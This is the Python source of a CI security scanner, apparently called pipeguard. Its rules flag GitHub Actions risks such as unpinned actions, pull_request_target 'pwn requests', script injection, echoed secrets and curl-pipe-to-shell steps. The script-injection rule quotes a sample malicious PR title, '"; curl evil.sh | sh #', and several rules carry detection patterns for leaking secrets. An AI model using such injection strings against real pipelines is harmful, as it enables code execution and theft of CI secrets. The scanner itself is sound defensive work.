"""GitHub Actions workflow rules (.github/workflows/*.yml)."""
from __future__ import annotations

import re
from typing import Iterator

import yaml

from ..models import Finding, Severity, SourceFile
from ..registry import finding, rule
from .common import PIPE_TO_SHELL, LineCursor

GH_DOCS = "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"
SHA_RE = re.compile(r"^[0-9a-f]{40}$")
EXPR_RE = re.compile(r"\$\{\{\s*(.*?)\s*\}\}")
# Contexts an outside contributor can control (from GitHub's security hardening guide).
UNTRUSTED = re.compile(
    r"github\.(head_ref"
    r"|event\.(issue\.(title|body)|pull_request\.(title|body|head\.(ref|label|repo\.default_branch))"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(title|body)"
    r"|pages\.[^.]+\.page_name|commits\.[^.]+\.(message|author\.(email|name))"
    r"|head_commit\.(message|author\.(email|name))|workflow_run\.(head_branch|head_commit\.message)))")


def _load(source: SourceFile) -> dict | None:
    try:
        data = yaml.safe_load(source.text)
    except yaml.YAMLError:
        return None
    return data if isinstance(data, dict) else None


def _triggers(wf: dict) -> set[str]:
    on = wf.get("on", wf.get(True))  # PyYAML reads the bare key `on` as boolean True
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {str(x) for x in on}
    if isinstance(on, dict):
        return {str(k) for k in on}
    return set()


def _jobs(wf: dict) -> dict:
    jobs = wf.get("jobs")
    return jobs if isinstance(jobs, dict) else {}


def _steps(job: dict) -> list[dict]:
    steps = job.get("steps") if isinstance(job, dict) else None
    return [s for s in steps if isinstance(s, dict)] if isinstance(steps, list) else []


def _all_runs(wf: dict) -> Iterator[str]:
    for job in _jobs(wf).values():
        for step in _steps(job):
            if isinstance(step.get("run"), str):
                yield step["run"]
            script = (step.get("with") or {}).get("script") if isinstance(step.get("with"), dict) else None
            if isinstance(script, str) and str(step.get("uses", "")).startswith("actions/github-script"):
                yield script


@rule("PG-GHA-001", "Action not pinned to a commit SHA", Severity.HIGH, "github_actions",
      "Tags like @v4 can be moved by whoever controls the action's repository. In March 2025 the "
      "tj-actions/changed-files tags were repointed to malicious code that dumped CI secrets into build logs.",
      "Pin to a full 40-character commit SHA and keep the version in a comment: "
      "uses: actions/checkout@<sha> # v4.2.2. `pipeguard pin` can do this for you.",
      (GH_DOCS, "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"))
def unpinned_action(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf:
        return
    cur = LineCursor(source)
    uses_list = []
    for job in _jobs(wf).values():
        if isinstance(job, dict) and isinstance(job.get("uses"), str):
            uses_list.append(job["uses"])
        uses_list += [s["uses"] for s in _steps(job) if isinstance(s.get("uses"), str)]
    for uses in uses_list:
        if uses.startswith("./") or (uses.startswith("docker://") and "@sha256:" in uses):
            continue
        ref = uses.rsplit("@", 1)[1] if "@" in uses else ""
        if not SHA_RE.match(ref):
            yield finding(unpinned_action, source, cur.find(uses),
                          f"'{uses}' is pinned to a mutable reference ('{ref or 'none'}'), not a commit SHA.")


@rule("PG-GHA-002", "pull_request_target checks out untrusted pull request code", Severity.CRITICAL,
      "github_actions",
      "pull_request_target runs with the base repository's secrets and a write token. Checking out the pull "
      "request's head and building it lets anyone who opens a PR run code with those secrets ('pwn request').",
      "Use the pull_request trigger for building PR code. If you need pull_request_target, never check out "
      "or execute the PR's head; split the work into an unprivileged workflow plus a workflow_run step.",
      ("https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",))
def pwn_request(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf or "pull_request_target" not in _triggers(wf):
        return
    for job in _jobs(wf).values():
        for step in _steps(job):
            if str(step.get("uses", "")).startswith("actions/checkout"):
                ref = str((step.get("with") or {}).get("ref", "")) if isinstance(step.get("with"), dict) else ""
                if "github.event.pull_request.head" in ref or "github.head_ref" in ref:
                    yield finding(pwn_request, source, source.line_of(ref.strip() or "actions/checkout"),
                                  "Workflow triggered by pull_request_target checks out the pull request head.")


@rule("PG-GHA-003", "Script injection from untrusted input", Severity.HIGH, "github_actions",
      "Expressions like ${{ github.event.issue.title }} are pasted into the script before it runs, so a PR "
      "title such as `\"; curl evil.sh | sh #` becomes shell code running in your pipeline.",
      "Pass the value through an environment variable instead: env: TITLE: ${{ github.event.issue.title }} "
      "and use \"$TITLE\" in the script.",
      (GH_DOCS,))
def script_injection(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf:
        return
    cur = LineCursor(source)
    for script in _all_runs(wf):
        for expr in EXPR_RE.findall(script):
            if UNTRUSTED.search(expr):
                yield finding(script_injection, source, cur.find(expr),
                              f"Untrusted value '${{{{ {expr} }}}}' is expanded directly inside a script.")


@rule("PG-GHA-004", "Workflow grants write-all permissions", Severity.HIGH, "github_actions",
      "write-all gives the GITHUB_TOKEN write access to code, packages, releases and more. If any step is "
      "compromised, the attacker can push to your repository.",
      "Grant only what each job needs, e.g. permissions: { contents: read } and add specific write scopes per job.",
      (GH_DOCS,))
def write_all(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf:
        return
    blocks = [wf.get("permissions")] + [j.get("permissions") for j in _jobs(wf).values() if isinstance(j, dict)]
    for perm in blocks:
        if perm == "write-all":
            yield finding(write_all, source, source.line_of("write-all"), "permissions: write-all is set.")
            return


@rule("PG-GHA-005", "No explicit token permissions", Severity.MEDIUM, "github_actions",
      "Without a permissions block the GITHUB_TOKEN gets the repository's default scopes, which are "
      "read-write on many older repositories and organisations.",
      "Add a top-level `permissions: { contents: read }` and widen it per job only where needed.",
      (GH_DOCS,))
def missing_permissions(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf or "permissions" in wf:
        return
    jobs = [j for j in _jobs(wf).values() if isinstance(j, dict)]
    if jobs and all("permissions" in j for j in jobs):
        return
    yield finding(missing_permissions, source, source.line_of("jobs:"),
                  "Neither the workflow nor every job sets `permissions`.")


@rule("PG-GHA-006", "Secret printed in a script", Severity.HIGH, "github_actions",
      "Masking in logs is best-effort: transformed values (base64, split strings, JSON) are not masked, "
      "and anyone with read access to the logs can see them.",
      "Never echo secrets. Pass them to tools through environment variables or files with restricted permissions.",
      (GH_DOCS,))
def secret_echo(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if re.search(r"\b(echo|printf|cat|tee)\b[^\n]*\$\{\{\s*secrets\.", line):
            yield finding(secret_echo, source, i, "A secret is written to the job output.")


@rule("PG-GHA-007", "Remote script piped to a shell", Severity.MEDIUM, "github_actions",
      "curl ... | sh runs whatever the server returns at that moment, with no integrity check.",
      "Download to a file, verify a checksum or signature, then run it, or use a pinned package or action.")
def gha_pipe_to_shell(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if PIPE_TO_SHELL.search(line):
            yield finding(gha_pipe_to_shell, source, i, "A downloaded script is piped straight into a shell.")


@rule("PG-GHA-008", "Checkout keeps credentials on disk", Severity.LOW, "github_actions",
      "actions/checkout stores the GITHUB_TOKEN in .git/config by default, where later steps (or uploaded "
      "artifacts containing .git) can read it.",
      "Add `with: { persist-credentials: false }` unless a later step needs to push.")
def persist_credentials(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf:
        return
    cur = LineCursor(source)
    for job in _jobs(wf).values():
        for step in _steps(job):
            uses = str(step.get("uses", ""))
            if uses.startswith("actions/checkout"):
                line = cur.find(uses)
                w = step.get("with") if isinstance(step.get("with"), dict) else {}
                if str(w.get("persist-credentials", "true")).lower() != "false":
                    yield finding(persist_credentials, source, line,
                                  "actions/checkout without persist-credentials: false.")


@rule("PG-GHA-009", "Unsafe workflow commands re-enabled", Severity.HIGH, "github_actions",
      "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables the deprecated set-env and add-path commands, which let "
      "anything printed to the log (including untrusted input) change the job's environment.",
      "Remove ACTIONS_ALLOW_UNSECURE_COMMANDS and use $GITHUB_ENV and $GITHUB_PATH files instead.",
      ("https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/",))
def unsecure_commands(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if re.search(r"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*['\"]?true", line, re.I):
            yield finding(unsecure_commands, source, i, "ACTIONS_ALLOW_UNSECURE_COMMANDS is set to true.")


@rule("PG-GHA-010", "Self-hosted runner used for pull requests", Severity.MEDIUM, "github_actions",
      "On public repositories, a pull request from a fork can run arbitrary code on your self-hosted runner "
      "and persist on that machine between jobs.",
      "Use GitHub-hosted or ephemeral runners for pull requests, or require approval for fork workflows.",
      ("https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security",))
def self_hosted_pr(source: SourceFile) -> Iterator[Finding]:
    wf = _load(source)
    if not wf or not ({"pull_request", "pull_request_target"} & _triggers(wf)):
        return
    for job in _jobs(wf).values():
        runs_on = job.get("runs-on") if isinstance(job, dict) else None
        labels = runs_on if isinstance(runs_on, list) else [runs_on]
        if any(str(x) == "self-hosted" for x in labels):
            yield finding(self_hosted_pr, source, source.line_of("self-hosted"),
                          "A job triggered by pull requests runs on a self-hosted runner.")
            return


@rule("PG-GHA-011", "All secrets passed to a reusable workflow", Severity.MEDIUM, "github_actions",
      "secrets: inherit hands every repository and organisation secret to the called workflow, "
      "even the ones it never uses.",
      "Pass only the secrets the reusable workflow needs, by name.")
def secrets_inherit(source: SourceFile) -> Iterator[Finding]:
    for i, line in enumerate(source.lines, start=1):
        if re.match(r"\s*secrets:\s*inherit\b", line):
            yield finding(secrets_inherit, source, i, "secrets: inherit passes all secrets to the called workflow.")
